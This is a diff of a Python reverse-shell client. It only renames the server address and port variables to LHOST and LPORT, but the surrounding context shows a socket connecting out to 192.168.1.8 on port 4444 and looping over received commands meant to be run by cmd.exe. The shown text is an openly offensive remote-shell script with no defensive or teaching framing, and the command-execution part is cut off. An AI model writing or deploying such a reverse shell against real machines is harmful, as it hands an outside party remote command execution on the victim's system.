@@ -2,10 +2,10 @@ import socket
 import subprocess
 
 # Run ifconfig to see server's local address
-SERVER_HOST_ADDR = "192.168.1.8"
+LHOST = "192.168.1.8"
 
 # Bind your preferable port
-SERVER_PORT = 4444
+LPORT = 4444
 
 # Buffer size limit
 BUFFER_SIZE = 1024
@@ -14,7 +14,7 @@ BUFFER_SIZE = 1024
 s = socket.socket()
 
 # Connecting to server with connect() method
-s.connect((SERVER_HOST_ADDR, SERVER_PORT))
+s.connect((LHOST, LPORT))
 
 while True:
     # Receiving commands from the server which are interpreted by cmd.exe in this case
